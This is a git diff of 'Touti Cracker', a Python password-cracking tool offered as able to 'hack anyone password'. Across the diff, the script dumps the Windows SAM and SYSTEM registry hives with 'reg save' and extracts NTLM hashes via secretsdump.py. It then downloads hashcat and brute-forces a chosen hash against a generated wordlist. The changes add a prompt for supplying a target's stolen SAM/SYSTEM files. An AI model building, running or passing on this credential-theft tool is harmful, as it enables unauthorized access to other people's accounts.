@@ -4,59 +4,67 @@ import os
 import requests
 import subprocess
 try:
-    gui = pyfiglet.figlet_format("Touti Cracker.beta", font="slant")
+    gui = pyfiglet.figlet_format("Touti Cracker", font="slant")
     print(gui)
     the_link="https://github.com/Touti-Sudo"
-    info=print("Welcome to Touti cracker and thank you for choosing my hacking tool if you want more informations about my tool you can check my README.txt you can also check my Github account:" + the_link + "\nThis tool will allow you to hack anyone password. This is for educationnal purpose only , i am not responsible for any bad and suspecious activities.Thank you for counsidring my words !! (this version is now just compatible for windows 11 but new updates will make it cross platform this my github account for more details) ")
-    user=input("\nwhat is the name of the  local acount that you are using on your computer ? : ")
+    info=print("Welcome to Touti cracker and thank you for choosing my hacking tool if you want more informations about my tool you can check my README.txt you can also check my Github account:" + the_link + "\nThis tool will allow you to hack anyone password. This is for educationnal purpose only , i am not responsible for any bad and suspicious activities.Thank you for counsidring my words !! (this version is now just compatible for windows 11 but new updates will make it cross platform this my github account for more details) ")
+    user=input("\nwhat is the name of the local acount that you are using on your computer ? : ")
 except KeyboardInterrupt:
     print("\nProgram interrupted. Exiting...")
     exit()
 def sauvegarder_registres():
-    print("Saving Registry keys...")
     chemin_backup = "C:\\Users\\"+user+"\\Desktop\\Backup"
-    chemin_system_save = os.path.join(chemin_backup, "system.save")
-    chemin_sam_save = os.path.join(chemin_backup, "sam.save")
+    registres=input("do you have the registers SAM.save and SYSTEM.save of the target if so put them in " +chemin_backup+ " to start bruteforce if you are using the programe just for a demo then you can extract the registers from your computer (y/n): ")
+
+
+    if registres.lower() == "n":
+        print("Saving Registry keys...")
+        chemin_system_save = os.path.join(chemin_backup, "system.save")
+        chemin_sam_save = os.path.join(chemin_backup, "sam.save")
 
    
-    os.makedirs(chemin_backup, exist_ok=True)
+        os.makedirs(chemin_backup, exist_ok=True)
 
    
-    if os.path.exists(chemin_system_save) and os.path.exists(chemin_sam_save):
-        print("Registry keys already saved. Skipping registry saving...")
-        return
+        if os.path.exists(chemin_system_save) and os.path.exists(chemin_sam_save):
+            print("Registry keys already saved. Skipping registry saving...")
+            return
 
 
-    commande_system = f'reg save HKLM\\system "{chemin_system_save}"'
-    commande_sam = f'reg save HKLM\\sam "{chemin_sam_save}"'
+        commande_system = f'reg save HKLM\\system "{chemin_system_save}"'
+        commande_sam = f'reg save HKLM\\sam "{chemin_sam_save}"'
 
-    result_system = subprocess.run(commande_system, shell=True, capture_output=True, text=True)
-    if result_system.returncode == 0:
-        print("System registry key saved successfully.")
-    else:
-        print(f"Error saving system registry key: {result_system.stderr}")
+        result_system = subprocess.run(commande_system, shell=True, capture_output=True, text=True)
+        if result_system.returncode == 0:
+            print("System registry key saved successfully.")
+        else:
+            print(f"{result_system.stderr}\nError saving system registry key , high privilege may be required so please restart Touti Cracker at admin mod")
+            exit()
 
-    result_sam = subprocess.run(commande_sam, shell=True, capture_output=True, text=True)
-    if result_sam.returncode == 0:
-        print("SAM registry key saved successfully.")
-    else:
-        print(f"Error saving SAM registry key: {result_sam.stderr}")
+        result_sam = subprocess.run(commande_sam, shell=True, capture_output=True, text=True)
+        if result_sam.returncode == 0:
+            print("SAM registry key saved successfully.")
+        else:
+            print(f"{result_sam.stderr}\nError saving SAM registry key , high privilege may be required so please restart Touti Cracker at admin mod")
+            exit()
+    if registres.lower() == "y":
+        print("thank you!!")
+    
 
 def cracker():
     request = input("Do you want to crack a password using that wordlist? (y/n): ").strip().lower()
     if request != "y":
         return
 
-    chemin_fichier = "C:\\Users\\" + user + "\\Desktop\\mot-de-passbf\\mot_de_passe_bf.txt"
+    chemin_fichier = "C:\\Users\\" + user + "\\Desktop\\Touti_Cracker\\mot_de_passe_bf.txt"
     systemtype = input("On which system are you? (e.g., Windows 11, Linux distro): ").strip().lower()
 
     if systemtype == "windows 11":
-        chemin_fichier_de_hashcat = "C:\\Users\\"+ user +"\\hashcat"
-        hashcatpath = "C:\\Users\\"+ user +"\\hashcat\\hashcat-6.2.6.7z"
+        chemin_fichier_de_hashcat = "C:\\Users\\" + user + "\\hashcat"
+        hashcatpath = chemin_fichier_de_hashcat + "\\hashcat-6.2.6.7z"
         url = r"https://hashcat.net/files/hashcat-6.2.6.7z"
-        chemin_extraction = "C:\\Users\\"+ user +"\\hashcat\\extracted"
+        chemin_extraction = chemin_fichier_de_hashcat + "\\extracted"
 
-    
         os.makedirs(chemin_fichier_de_hashcat, exist_ok=True)
 
         if not os.path.exists(hashcatpath):
@@ -71,7 +79,6 @@ def cracker():
                 print("Failed to download Hashcat.")
                 return
 
-   
         if not os.path.exists(chemin_extraction):
             os.makedirs(chemin_extraction, exist_ok=True)
             command = f'"C:\\Program Files\\7-Zip\\7z.exe" x "{hashcatpath}" -o"{chemin_extraction}" -y'
@@ -83,29 +90,37 @@ def cracker():
                 print(f"Error unzipping Hashcat: {result.stderr}")
                 return
 
-   
         sauvegarder_registres()
 
-   
+
         print("Extracting hashes from system and SAM files...")
-        command_for_extracth = "py C:\\Users\\"+user+"\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\secretsdump.py -sam C:\\Users\\"+user+"\\Desktop\\Backup\\sam.save -system C:\\Users\\"+user+"\\Desktop\\Backup\\system.save LOCAL"
+        command_for_extracth = (
+            f'py C:\\Users\\{user}\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\secretsdump.py '
+            f'-sam C:\\Users\\{user}\\Desktop\\Backup\\sam.save '
+            f'-system C:\\Users\\{user}\\Desktop\\Backup\\system.save LOCAL'
+        )
         resultextract = subprocess.run(command_for_extracth, shell=True, capture_output=True, text=True)
         print("These are the results:\n" + resultextract.stdout)
 
+        yourhash = input("Please write the hash that you want to crack (from the results): ")
 
-        yourhash = input("Please write the hash that you want to crack from the results: ")
-        chemin_extraction2 = "C:\\Users\\"+user+"\\hashcat\\extracted\\hashcat-6.2.6\\hashcat.exe"
+        chemin_extraction2 = chemin_extraction + "\\hashcat-6.2.6\\hashcat.exe"
+        os.chdir(os.path.dirname(chemin_extraction2)) 
         print("Launching Hashcat...")
 
         command_lunch_hashcat = f'"{chemin_extraction2}" -m 1000 "{yourhash}" "{chemin_fichier}"'
         command_lunch_hashcats = subprocess.run(command_lunch_hashcat, shell=True, capture_output=True, text=True)
-        print(command_lunch_hashcats.stdout)    
+        print(command_lunch_hashcats.stdout)
         if command_lunch_hashcats.stderr:
             print("\n=== Hashcat Errors ===")
             print(command_lunch_hashcats.stderr)
 
+    else:
+        print("Linux and Mac are actually not compatible with the program but they will be in the future.")
+        exit()
+
 def generer_mots_de_passe():
-    chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\mot-de-passbf\\mot_de_passe_bf.txt"
+    chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\mot_de_passe_bf.txt"
     number_of_generated_words = int(input("How many passwords do you want to generate for brute force? : "))
     informations = []
 
@@ -139,12 +154,12 @@ def generer_mots_de_passe():
 
 while True:
     try:
-        choice = input("Do you want to specify information and generate passwords? (y/n): ").strip().lower()
+        choice = input("Do you want to specify information to generate passwords or just generate them randomly? (y/n): ").strip().lower()
         if choice == "y":
             generer_mots_de_passe()
             break
         elif choice == "n":
-            chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\mot-de-passbf\\mot_de_passe_bf.txt"
+            chemin_fichier = "C:\\Users\\"+user+"\\Desktop\\Touti_Cracker\\mot_de_passe_bf.txt"
             chifrre = "0123456789"
             lettre = "azertyuiopmlkjhgfdsqwxcvbn"
             lettreup = lettre.upper()
@@ -174,3 +189,7 @@ while True:
         break
     except ValueError as e:
         print(f"Error: {e}")
+        break
+    except PermissionError :
+        print("Error please run Touti Cracker at admin mod!")
+        break
